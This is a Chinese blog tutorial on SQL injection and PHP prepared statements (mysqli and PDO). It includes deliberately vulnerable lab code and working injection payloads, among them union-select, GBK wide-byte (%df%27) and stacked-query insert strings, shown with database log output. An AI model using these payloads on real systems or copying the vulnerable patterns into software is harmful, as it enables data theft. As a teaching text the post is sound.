    <content type="html"><![CDATA[<h2 id="SQL注入-amp-预编译"><a href="#SQL注入-amp-预编译" class="headerlink" title="SQL注入&amp;预编译"></a>SQL注入&amp;预编译</h2><p>这篇文章来源于被预编译搞的头疼，捡垃圾的我只是想捡个注入，然鹅随着使用预编译的广泛使用，让我这个捡垃圾的捡不到注入了。但听说预编译防止不了排序处的注入，于是乎想自己看一下，然后就又能多个捡垃圾的路子了。多捡点垃圾的话晚上就能加个蛋了Q_A_Q</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/1.png"></p><h3 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h3><p>很久很久以前，用户的传参是能够直接拼接到sql的查询语句中去，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">// index.php<br>&lt;?php<br>$username = $_POST[&#x27;username&#x27;];<br>mysqli_select_db($conn,sort) or die ( &quot;Unable to connect to the database: test&quot;);<br># 选择数据库<br><br>$sql = &quot;select fraction from fraction where name = &#x27;$username&#x27;;&quot;;# 直接将用户输入拼接进字符串<br>$result = mysqli_query($conn,$sql);<br>echo &#x27;&lt;br/&gt;&#x27;.$sql.&#x27;&lt;br/&gt;&#x27;;# 打印sql语句<br><br>if($fraction = mysqli_fetch_assoc( $result ))&#123;<br>    echo &#x27;查询成功&#x27;;<br>&#125;<br>else&#123;<br>    mysqli_error($conn);<br>&#125;<br><br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;学生:&#x27;.$username;<br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;分数:&#x27;.$fraction[&#x27;fraction&#x27;];<br><br>$conn-&gt;close();<br>?&gt;<br></code></pre></td></tr></table></figure><p>这里构建了一个简单的查询分数的功能，可以看到直接将用户的输入带入到了sql语句中，这sql注入很明显了</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/2.png" alt="分数表"></p><p>这里可以直接构造payload来实现注入</p><p>payload:<code>1&#39;union select database();#</code></p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/3.png"></p><p>这种情况下，如果做安全防护的话，也只能是从效验用户的输入入手了，但是效验规则大概率都能进行绕过，只不过是绕的难易不一样罢了。但是现在已经进入到了预编译的时代，拼接的情况虽然有，但较少了，再加上防护设备的广泛应用，</p><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>据听说，预编译一开始是为了提高MySQL的运行效率而诞生，但是由于其先构建语法树，后带入查询参数的特性导致其具有了防止SQL注入的特性。这里简单说一下MySQL的预处理语句的使用，以及防止SQL的注入的原因(因为其他数据库一点不会)</p><h4 id="MySQL预编译"><a href="#MySQL预编译" class="headerlink" title="MySQL预编译"></a>MySQL预编译</h4><p>MySQL预编译执行分为三步：</p><p>1.执行预编译语句，构建语法树，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from &quot;select fraction from fraction where name = ?&quot;;<br># 使用PREPARE stmt_name FROM preparable_stm语法<br># stmt_name是语句名，preparable_stm是具体要执行的语句，变量先由 ？ 进行占位<br></code></pre></td></tr></table></figure><p>2.设置变量，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @a=&#x27;mechoy&#x27;;<br></code></pre></td></tr></table></figure><p>3.执行，将设置的变量代入到已经构建好的语句中进行执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">execute sel using @a;<br># 使用EXECUTE stmt_name [USING @var_name [, @var_name] ...]语法<br># 变量位置与占位符一一对应<br></code></pre></td></tr></table></figure><p>执行结束后查看数据库日志：</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/4.png"></p><p>可以看到在使用预处理语句时，数据库共进行了四步操作：1.构建预处理语句；2.设置变量；3.绑定变量；4.执行查询</p><p>预编译的优势在于其不用每一次都构建语法树，以上面为例，当有<code>@b=&#39;admin&#39;</code>时，执行<code>execute sel using @b;</code>时，数据库会直接去fraction表中查询<code>name=admin</code>的fraction值，而不用再一次构建语法树，这可能也就是预编译语句为何能提高MySQL效率的原因</p><p>而预编译语句在防止SQL注入上，看下面这张图：</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/5.png"></p><p>在@b和@c的情况下返回都为空，也就是将@b和@c的值只是当做一个变量，去寻找name字段中与其相同的</p><p>如果在数据库中插入一条<code>name=xx union select database()</code>数据，再次执行就会获得相应的值</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/6.png"></p><p>再执行就会得到如下结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; execute sel using @c;<br>+----------+<br>| fraction |<br>+----------+<br>|      100 |<br>+----------+<br></code></pre></td></tr></table></figure><p>所以这里变量只是一个变量，只是用来比较name字段中是否存在相同的值，存在则返回fraction的值，不存在则返回空，这就是预编译为什么能防止SQL注入的原因。</p><h4 id="PHP-MySQL-预处理语句"><a href="#PHP-MySQL-预处理语句" class="headerlink" title="PHP+MySQL 预处理语句"></a>PHP+MySQL 预处理语句</h4><p>在使用PHP编写预处理语句时，会遇到预编译和模拟预编译(这里先提一下)</p><p>PHP中连接MySQL数据库目前两种较为常见的方法：</p><ul><li>Mysqli</li><li>PDO</li></ul><p>这里先说一下使用Mysqli的预编译语句进行数据的查询</p><h5 id="Mysqli"><a href="#Mysqli" class="headerlink" title="Mysqli"></a>Mysqli</h5><p><code>Mysqli</code>扩展允许我们访问MySQL 4.1及以上版本提供的功能。</p><p>使用PHP的Mysqli实现预编译如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"># index1.php<br># $conn为与mysql数据库建立的链接，同时选择<br>&lt;?php<br>$username = $_POST[&#x27;username&#x27;];<br><br># $stmt = $conn-&gt;prepare(&quot;select fraction from fraction where name = ?&quot;);   预处理以及绑定<br>$stmt = mysqli_stmt_init($conn);    # 分配并初始化一个语句对象用于mysqli_stmt_prepare()。<br>mysqli_stmt_prepare($stmt,&quot;select fraction from fraction where name = ?&quot;);  # 预处理<br>mysqli_stmt_bind_param($stmt,&quot;s&quot;, $username);   # 绑定<br><br># $stmt-&gt;execute();# 执行<br>mysqli_stmt_execute($stmt);<br>mysqli_stmt_bind_result($stmt,$fraction);   # 将查询结果绑定至$fraction<br><br>if(mysqli_stmt_fetch($stmt))&#123;<br>    echo &#x27;查询成功&#x27;;<br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;学生:&#x27;.$username;<br>echo &#x27;&lt;br/&gt;&#x27;;<br># echo &#x27;分数:&#x27;.$fraction;<br>print(&quot;分数: &quot;.$fraction.&quot;\n&quot;);<br>&#125;<br>else&#123;<br>    mysqli_stmt_errno($stmt);<br>&#125;<br><br>$conn-&gt;close();<br>?&gt;<br></code></pre></td></tr></table></figure><p>执行查询<code>name=&quot;mechoy&quot;</code>，查看数据库日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Connectroot@localhost on sort using TCP/IP<br>Prepareselect fraction from fraction where name = ?<br>Executeselect fraction from fraction where name = &#x27;mechoy&#x27;<br># 可以看到这里共分成了三步：1.建立连接；2.构建语法树；3.执行<br></code></pre></td></tr></table></figure><p>这里看起来跟MySQL的预处理语句基本相同，只不过因为这里少了设置变量和将变量绑定进预编译的两步。</p><p>执行查询<code>name=&quot;mechoy&#39; union select database();#&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">4 Connectroot@localhost on sort using TCP/IP<br>4 Prepareselect fraction from fraction where name = ?<br>4 Executeselect fraction from fraction where name = &#x27;mechoy\&#x27; union select database();#&#x27;<br></code></pre></td></tr></table></figure><p>发现这里输入的单引号被转义了，预编译+转义，好像跟SQL注入说再见了，对于我这个只会Sqlmap一把梭的人，好像跟全世界再见了</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/8.png"></p><h5 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h5><ul><li>PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。</li><li>PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。</li><li>PDO随PHP5.1发行，在PHP5.0的PECL扩展中也可以使用，无法运行于之前的PHP版本。</li></ul><p>使用PDO实现预编译如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"># index2.php<br>&lt;?php<br>$username = $_POST[&#x27;username&#x27;]; // 接收username<br><br># 建立数据库连接<br>header(&quot;Content-Type:text/html;charset=utf-8&quot;);<br>$dbs = &quot;mysql:host=127.0.0.1;dbname=sort&quot;;<br>$dbname = &quot;root&quot;;<br>$passwd = &quot;root&quot;;<br><br>// 创建连接,选择数据库,检测连接<br>try&#123;<br>    $conn = new PDO($dbs, $dbname, $passwd);<br>    echo &quot;连接成功&lt;br/&gt;&quot;;<br>&#125;<br>catch (PDOException $e)&#123;<br>    die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);<br>&#125;<br><br># 设置预编译语句，绑定参数，这里使用命名占位符<br>$stmt = $conn-&gt;prepare(&quot;select fraction from fraction where name = :username&quot;);<br>$stmt-&gt;bindParam(&quot;:username&quot;,$username);<br>$stmt-&gt;execute();<br><br>if($fraction = $stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123;<br>    echo &#x27;查询成功&#x27;;<br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;学生:&#x27;.$username;<br>echo &#x27;&lt;br/&gt;&#x27;;<br># echo &#x27;分数:&#x27;.$fraction;<br>print_r(&quot;分数&quot;.$fraction[fraction]);<br>&#125;<br>else&#123;<br><br>&#125;<br>$conn=null; # 关闭链接<br>?&gt;<br></code></pre></td></tr></table></figure><p>执行查询<code>name=&quot;mechoy&quot;</code>，查看数据库日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">27 Connectroot@localhost on sort using TCP/IP# 简历连接<br>27 Queryselect fraction from fraction where name = &#x27;mechoy&#x27;# 执行查询<br>27 Quit# 结束<br></code></pre></td></tr></table></figure><p>从日志来看，没有prepare和execute，只是执行了一个查询的SQL语句，并没有进行预编译。显然，PDO默认情况下使用的是模拟预编译。</p><blockquote><p>模拟预编译是防止某些数据库不支持预编译而设置的(如sqllite与低版本MySQL)。如果模拟预处理开启，那么客户端程序内部会模拟MySQL数据库中的参数绑定这一过程。也就是说，程序会在内部模拟prepare的过程，当执行execute时，再将拼接后的完整SQL语句发送给MySQL数据库执行。</p></blockquote><p>而想要真正使用预编译，首先需要数据库支持预编译，再在代码中加入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span> -&gt; setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="hljs-literal">false</span>);<br><span class="hljs-comment"># bool PDO::setAttribute ( int $attribute , mixed  $value )设置数据库句柄属性。</span><br><span class="hljs-comment"># PDO::ATTR_EMULATE_PREPARES 启用或禁用预处理语句的模拟。 有些驱动不支持或有限度地支持本地预处理。使用此设置强制PDO总是模拟预处理语句（如果为 TRUE  ），或试着使用本地预处理语句（如果为 FALSE ）。如果驱动不能成功预处理当前查询，它将总是回到模拟预处理语句上。需要 bool  类型。 </span><br><span class="hljs-comment">#这里在PHP5.2.17时无效，暂未找到原因</span><br><span class="hljs-comment">#更改版本为PHP5.6.9时生效</span><br></code></pre></td></tr></table></figure><p>再执行查询<code>name=&quot;mechoy&quot;</code>，查看数据库日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">4 Connectroot@localhost on sort using TCP/IP<br>4 Prepareselect fraction from fraction where name = ?<br>4 Executeselect fraction from fraction where name = &#x27;mechoy&#x27;<br>4 Close stmt<br>4 Quit<br># 可以看到当PDO::ATTR_EMULATE_PREPARES设置为false时，取消了模拟预处理，采用本地预处理<br></code></pre></td></tr></table></figure><h3 id="预编译所不能防范的注入"><a href="#预编译所不能防范的注入" class="headerlink" title="预编译所不能防范的注入"></a>预编译所不能防范的注入</h3><h4 id="PDO模拟预处理-宽字节"><a href="#PDO模拟预处理-宽字节" class="headerlink" title="PDO模拟预处理+宽字节"></a>PDO模拟预处理+宽字节</h4><p>模拟代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># index3.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// PHP5.2.17+MySQL5.7.26+Apache2.4.39环境下</span><br><span class="hljs-comment">// PHP5.6.9时无法实现</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]; <span class="hljs-comment">// 接收username</span><br><br><span class="hljs-comment"># 建立数据库连接</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort1;charset=gbk&quot;</span>;<span class="hljs-comment">// 设置数据库字符编码</span><br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// 创建连接,选择数据库,检测连接</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># 设置模拟预编译语句，绑定参数，这里使用命名占位符</span><br><span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-string">&#x27;SET NAMES GBK&#x27;</span>);<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select fraction from fraction where name = :username&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&quot;:username&quot;</span>,<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$fraction</span> = <span class="hljs-variable">$stmt</span>-&gt;fetch();<br>var_dump(<span class="hljs-variable">$fraction</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># 关闭链接</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当传入<code>username=&quot;1&#39; union select database();#&quot;</code>时，看数据库日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">28 Connectroot@localhost on sort using TCP/IP<br>28 Queryselect fraction from fraction where name = &#x27;mechoy\&#x27; union select database()#&#x27;<br>28 Quit<br># 将单引号进行转义<br></code></pre></td></tr></table></figure><blockquote><p>模拟预处理防止sql注入的本质是在参数绑定过程中对参数值进行转义与过滤,这一点与真正的sql数据库预处理是不一样的。理论上，sql数据库预编译更加安全一些。</p></blockquote><p>当传入<code>1%df%27%20union%20select%20database();#</code>时，再查看数据库日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">15 Connectroot@localhost on sort1 using TCP/IP<br>15 QuerySET NAMES GBK<br>15 Queryselect fraction from fraction where name = &#x27;1運&#x27; union select database();<br>//可以看到成功利用%df吃掉斜杠，造成宽字节注入<br></code></pre></td></tr></table></figure><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/9.png"></p><h4 id="PDO的错误使用"><a href="#PDO的错误使用" class="headerlink" title="PDO的错误使用"></a>PDO的错误使用</h4><p>一些稍微欠缺经验的开发人员，可能会错误的使用PDO，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// index4.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]; <span class="hljs-comment">// 接收username</span><br><br><span class="hljs-comment"># 建立数据库连接</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort1&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// 创建连接,选择数据库,检测连接</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># 感觉用了预编译语句，但又好像没完全用</span><br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select fraction from fraction where name = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$fraction</span> = <span class="hljs-variable">$stmt</span>-&gt;fetch();<br>var_dump(<span class="hljs-variable">$fraction</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># 关闭链接</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这种看似用了prepare进行预处理，但没有关键性的占位符、参数绑定，所以等同于直接拼接</p><h4 id="PDO中的多条执行"><a href="#PDO中的多条执行" class="headerlink" title="PDO中的多条执行"></a>PDO中的多条执行</h4><p>PDO有一个有趣的特性：默认可以支持多条SQL执行。这就造成了堆叠注入的可能，如下例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&lt;?php<br>$id= $_GET[&#x27;id&#x27;]; // 接收username<br><br># 建立数据库连接<br>$dbs = &quot;mysql:host=127.0.0.1;dbname=sort&quot;;<br>$dbname = &quot;root&quot;;<br>$passwd = &quot;root&quot;;<br><br>// 创建连接,选择数据库,检测连接<br>try&#123;<br>$conn = new PDO($dbs, $dbname, $passwd);<br>echo &quot;Sucussful&lt;br/&gt;&quot;;<br>&#125;<br>catch (PDOException $e)&#123;<br>die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);<br>&#125;<br><br># 感觉用了预编译语句，但又好像没完全用<br>$stmt = $conn-&gt;prepare(&quot;select fraction from fraction where id=$id&quot;);<br>$stmt-&gt;execute();<br>$fraction = $stmt-&gt;fetch();<br>print_r($fraction[fraction]);<br><br>$conn=null; # 关闭链接<br>?&gt;<br></code></pre></td></tr></table></figure><p>当输入<code>id=1;select%20database()</code>时，查看数据库日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">5 Connectroot@localhost on sort using TCP/IP<br>5 Queryselect fraction from fraction where id=1;<br>5 Queryselect database()<br># 数据库执行了两条查询语句<br></code></pre></td></tr></table></figure><p>但这样有个问题是，回显位置只有1个，无法回显出第二条查询语句的结果，但可以通过先将内容插入到数据库中，然后再通过查询做出来</p><p>先执行：<code>?id=1;insert into fraction(id,name,fraction) values(111,database(),user()) </code></p><p>查看数据库日志以及数据库是否插入内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">10 Connectroot@localhost on sort using TCP/IP<br>10 Queryselect fraction from fraction where id=1;<br>10 Queryinsert into fraction(id,name,fraction) values(111,database(),user())<br># 可以看到执行了两条语句<br></code></pre></td></tr></table></figure><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/10.png"></p><p>再执行：<code>id=111</code>，能够看到成功查询，但有个问题是当回显位置的值是有个数字型时，就无法直接将我们想要获取的内容存入到数据库的相应字段中了，但好像也有办法，可以尝试一下</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/11.png"></p><h4 id="预编译不生效"><a href="#预编译不生效" class="headerlink" title="预编译不生效"></a>预编译不生效</h4><p>不是所有的地方都能使用预编译语句，有些位置可能会存在使用预编译之后，sql语句不生效，而这些位置又不得不使用拼接。</p><h5 id="like位置"><a href="#like位置" class="headerlink" title="like位置"></a>like位置</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php">index6.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]; <span class="hljs-comment">// 接收username</span><br><br><span class="hljs-comment"># 建立数据库连接</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// 创建连接,选择数据库,检测连接</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dbs</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$passwd</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sucussful&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;getMessage() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># 感觉用了预编译语句，但又好像没完全用</span><br><span class="hljs-variable">$conn</span> -&gt; setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="hljs-literal">false</span>);<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;select * from fraction where name like &#x27;%:username%&#x27;&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;bindParam(<span class="hljs-string">&quot;:username&quot;</span>,<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$fraction</span> = <span class="hljs-variable">$stmt</span>-&gt;fetchAll(PDO::FETCH_ASSOC);<br>print_r(<span class="hljs-variable">$fraction</span>);<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>; <span class="hljs-comment"># 